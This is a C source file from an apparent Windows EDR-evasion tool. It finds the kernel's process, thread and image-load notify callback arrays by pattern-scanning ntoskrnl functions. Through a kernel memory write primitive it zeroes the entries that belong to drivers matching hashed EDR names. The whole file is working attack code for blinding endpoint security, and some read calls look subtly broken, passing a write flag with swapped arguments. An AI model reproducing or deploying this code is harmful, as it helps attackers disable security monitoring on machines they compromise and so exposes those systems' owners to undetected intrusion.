#include "Common.h"
#include "Structs.h"

#include "RemoveCallBacks.h"

#include "stdio.h"


// Process and clear EDR callbacks if needed
VOID ProcessDriverCallback(INT64 baseAddr, UINT64 index, INT64 driverAddr, BYTE* data) {
	// Validate input parameters
    if (!baseAddr || !data || !driverAddr) {
        return;
    }

    // Calculate target address once to avoid multiple calculations
    PVOID targetAddr = (PVOID)(baseAddr + (index * 8));

    // Get and validate driver name
    CHAR* driverName = GetDriverName(driverAddr);
    if (!driverName) {
        return;
    }


    // Print driver information and handle EDR detection

	PRINT("%s", driverName);
    
    if (IsEDRHash(driverName)) {
        // Clear EDR callback entry
        DriverMemoryOperation(data, targetAddr, 8, MEMORY_WRITE);
		PRINT("\t[Clear]\n");		
    } else {
		PRINT("\n"); 
    }
}

INT64 GetPspNotifyRoutineArrayH(UINT32 KernelCallbackRegFuncHash) {
	BYTE* buffer = (BYTE*)malloc(1);
	DWORD dwMajor = GetNtVersion();
	UINT64 offset = 0;
	UINT64 PspOffset = 0;
	UINT64 PspSetCallbackssNotifyRoutineAddress = 0;
	
	UINT64 PsSetCallbacksNotifyRoutineAddress = GetFuncAddressH(NTOSKRNLEXE_CH, KernelCallbackRegFuncHash);

	if (!PsSetCallbacksNotifyRoutineAddress) {
		PRINT("Can't get the address!\n");
		return 0;
	}

	// For Win10 or Win8/8.1 process callbacks
	if (dwMajor >= 10 || (dwMajor == 6 && (KernelCallbackRegFuncHash == PsSetCreateProcessNotifyRoutine_CH) )) {

		UINT64 callInstrAddr = FindPattern(PsSetCallbacksNotifyRoutineAddress, &PREDEFINED_PATTERNS[0], 200);

		// Calculate Offset
		offset = CalculateOffset(callInstrAddr, 0, 4);

		PspSetCallbackssNotifyRoutineAddress = callInstrAddr + offset + 5;
			
	}
	else if (dwMajor == 6) { // Win7/8
		PspSetCallbackssNotifyRoutineAddress = PsSetCallbacksNotifyRoutineAddress;
	}
	else {
		return 0; // Unsupported OS version
	}

	PRINT("Target VA: 0x%p\r\n", (PVOID)PspSetCallbackssNotifyRoutineAddress);

	
	offset = 0;

	
	UINT64 leaInstrAddr = FindPattern(PspSetCallbackssNotifyRoutineAddress, &PREDEFINED_PATTERNS[1], 200);

	// Calculate final offset

	offset = CalculateOffset(leaInstrAddr, 2, 6);
	
	// Calculate array VA
	// PspNotifyRoutineArrayAddress = leaInstrAddr + PspOffset + 7
	return leaInstrAddr + offset + 7;
}

// Prints and clears callback entries
VOID PrintAndClearCallBack(INT64 PspNotifyRoutineAddress, CHAR* CallBackRegFunc) {
	// Validate input parameters
	if (!PspNotifyRoutineAddress || !CallBackRegFunc) {
		PRINT("Invalid parameters provided\n");
		return;
	}

	// Use stack memory instead of heap to avoid memory fragmentation
	BYTE data[8] = {0};
	
	PRINT("----------------------------------------------------\n");
	PRINT("Register driver for %s callback: \n----------------------------------------------------\n\n", CallBackRegFunc);

	// Define array size as constant for better maintainability
	static const UINT64 MAX_CALLBACKS = 64;
	UINT64 processedCount = 0;

	// Iterate through callback array
	for (UINT64 k = 0; k < MAX_CALLBACKS; k++) {
		INT64 buffer = 0;
		
		// Read callback entry
		DriverMemoryOperation((VOID*)(PspNotifyRoutineAddress + (k * 8)), &buffer, 8, MEMORY_WRITE);
		if (!buffer) continue;

		// Extract callback address using bitwise operation (equivalent to (buffer >> 4) << 4)
		INT64 tmpaddr = buffer & ~0xFULL;
		if (!tmpaddr) continue;

		// Get driver callback function address
		INT64 DriverCallBackFuncAddr = 0;
		DriverMemoryOperation((VOID*)(tmpaddr + 8), &DriverCallBackFuncAddr, 8, MEMORY_WRITE);
		if (!DriverCallBackFuncAddr) continue;

		// Get and validate driver name
		CHAR* DriverName = GetDriverName(DriverCallBackFuncAddr);
		if (!DriverName) continue;

		// Increment processed count for monitoring
		processedCount++;
		PRINT("%s", DriverName);
		
		// Handle EDR driver detection and clearing
		if (IsEDRHash(DriverName)) {
			DriverMemoryOperation(data, (PVOID)(PspNotifyRoutineAddress + (k * 8)), 8, MEMORY_WRITE);
			PRINT("\t[Clear]\n");
		} else {
			PRINT("\n");
		}
	}

	// Print summary of processed callbacks
	PRINT("\nProcessed %llu callback(s)\n\n", processedCount);
}


VOID ClearThreeCallBack() {
	// Define callback type structure
	struct CallbackInfo {
		UINT32	routineNameHash;
		const CHAR* routineName;
		INT64 address;
	};
	

	// Define all callbacks to be processed
	struct CallbackInfo callbacks[] = {
		{PsSetCreateProcessNotifyRoutine_CH,"PsSetCreateProcessNotifyRoutine", 0},
		{PsSetCreateThreadNotifyRoutine_CH,	"PsSetCreateThreadNotifyRoutine", 0},
		{PsSetLoadImageNotifyRoutine_CH,	"PsSetLoadImageNotifyRoutine", 0}
	};
	
	// Get and process all callbacks
	for (int i = 0; i < sizeof(callbacks) / sizeof(callbacks[0]); i++) {
		callbacks[i].address = GetPspNotifyRoutineArrayH(callbacks[i].routineNameHash);
		
		if (callbacks[i].address) {
			PrintAndClearCallBack(callbacks[i].address, (CHAR*)callbacks[i].routineName);
		} else {
			PRINT("Failed to obtain %s callback address.\n", callbacks[i].routineName);
		}
	}
}